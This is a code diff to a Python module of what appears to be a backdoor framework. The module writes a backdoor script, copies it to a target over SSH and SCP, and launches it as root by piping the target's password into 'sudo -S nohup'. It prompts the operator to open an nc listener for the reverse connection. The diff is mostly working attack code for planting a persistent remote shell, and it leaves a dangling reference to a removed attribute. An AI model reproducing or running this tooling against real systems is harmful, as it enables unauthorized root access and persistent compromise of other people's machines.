@@ -3,32 +3,23 @@ from backdoor import *
 class Pyth(Backdoor):
     prompt = Fore.RED + "(py) " + Fore.BLUE + ">> " + Fore.RESET 
     
-    def __init__(self, target, core):
+    def __init__(self, core):
         cmd.Cmd.__init__(self)
         self.intro = GOOD + "Using Python module"
-        self.target = target
         self.core = core
         self.options = {
                 "port"   : Option("port", 53922, "port to connect to", True),
                 }
-        self.command = "echo " + self.target.pword + " | sudo -S nohup python pythBackdoor.py"
         self.enabled_modules = {}
         self.modules = {}
         self.allow_modules = True
 
-    def check_valid(self):
-        return True
-    
-    def get_value(self, name):
-        if name in self.options:
-            return self.options[name].value
-        else:
-            return None
-
+    def get_command(self):
+        return  "echo " + self.core.curtarget.pword + " | sudo -S nohup python pythBackdoor.py"
 
     def do_exploit(self, args):
         port = self.get_value("port")
-
+        target = self.core.curtarget
         toW = 'pythScript/pythBackdoor.py'
         stringToAdd = ""
         fileToWrite = open(toW, 'w')
@@ -44,10 +35,10 @@ class Pyth(Backdoor):
         fileToWrite.write(stringToAdd)
         fileToWrite.close()
         raw_input("Run the following command: nc -v -n -l -p %s in another shell." % port)
-        self.target.ssh.exec_command('rm pythBackdoor.py')
-        self.target.scpFiles(self, 'pythScript/pythBackdoor.py', False)
+        target.ssh.exec_command('rm pythBackdoor.py')
+        target.scpFiles(self, 'pythScript/pythBackdoor.py', False)
         print(GOOD + "Moving the backdoor script.")
-        self.target.ssh.exec_command(self.command)
+        target.ssh.exec_command(self.command)
         print(GOOD + "Python backdoor on %s attempted." % port)
 
 
